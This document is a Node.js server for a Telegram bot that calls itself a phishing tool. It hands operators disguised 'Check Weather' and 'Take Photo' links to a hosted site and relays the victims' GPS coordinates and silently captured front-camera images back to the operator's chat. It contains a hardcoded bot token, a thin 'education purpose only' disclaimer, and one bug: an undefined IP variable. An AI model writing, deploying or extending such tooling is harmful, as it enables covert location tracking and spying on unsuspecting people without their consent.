const express = require("express");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.static("public"));

// 🔐 CONFIG (put yours here)
const TOKEN = "8653888099:AAE7kkVarBwcEdMQ7S1ZlrUoLyy9HP86TT";
const BASE_URL = "https://phishing-md.onrender.com";

// 🤖 BOT
const bot = new TelegramBot(TOKEN, {
  polling: {
    autoStart: true,
    interval: 1000
  }
});

// 🟢 START
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id,
`😌WELCOE TO TEMPLEDOMIC PHISHING BOT😌
U CAN USE THIS TOOL TO GET INFO ABOUT YOUR VICTIM WITH JUST A LINK 🙂‍↔️

NOTE:THIIS BOT FOLLOW TERMS AND CONDITION OF TELEGRAM AND ANYTHING DISPLAYED HERE IS STRICTLY FOR EDUCATION PURPOSE ONLY ONLY 

🌍 /weather - GET TARGET LOCATION
📸 /camera - TAKE A SILENT IMAGE OF THIER FRONT CAMERA`
  );
});

// 🌦️ WEATHER (MAIN FEATURE - PRIORITY)
bot.onText(/\/weather/, (msg) => {
  bot.sendMessage(msg.chat.id, "🌦️ Open Weather:", {
    reply_markup: {
      inline_keyboard: [[
        {
          text: "🌦️ Check Weather",
          url: `${BASE_URL}/weather.html?chat=${msg.chat.id}`
        }
      ]]
    }
  });
});

// 📸 CAMERA
bot.onText(/\/camera/, (msg) => {
  bot.sendMessage(msg.chat.id, "📸 Open Camera:", {
    reply_markup: {
      inline_keyboard: [[
        {
          text: "📸 Take Photo",
          url: `${BASE_URL}/camera.html?chat=${msg.chat.id}`
        }
      ]]
    }
  });
});

// 📸 CAMERA RESULT
app.post("/camera", (req, res) => {
  try {
    const { chatId, image } = req.body;

    if (!chatId || !image) return res.sendStatus(400);

    const base64 = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64, "base64");

    bot.sendPhoto(chatId, buffer, {
      caption: "📸 Photo received"
    });

    res.json({ ok: true });
  } catch (err) {
    console.log("camera error:", err);
    res.sendStatus(500);
  }
});

// 🌦️ WEATHER RESULT (MAIN LOGIC)
app.post("/weather", (req, res) => {
  try {
    const { chatId, lat, lon, weather } = req.body;

    if (!chatId) return res.sendStatus(400);

    bot.sendMessage(chatId,
`🌦️ WEATHER REPORT

📍 Location:
Latitude: ${lat}
Longitude: ${lon}
🎯 IP Address 
IP:${ip}
🌡️ Temperature: ${weather?.temperature ?? "N/A"}°C
💨 Wind Speed: ${weather?.windspeed ?? "N/A"} km/h`
    );

    res.json({ ok: true });
  } catch (err) {
    console.log("weather error:", err);
    res.sendStatus(500);
  }
});

// 🔥 KEEP ALIVE (helps Render)
setInterval(() => {
  console.log("bot alive");
}, 30000);

// 🚀 START SERVER
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("🔥 Server running on port", PORT);
});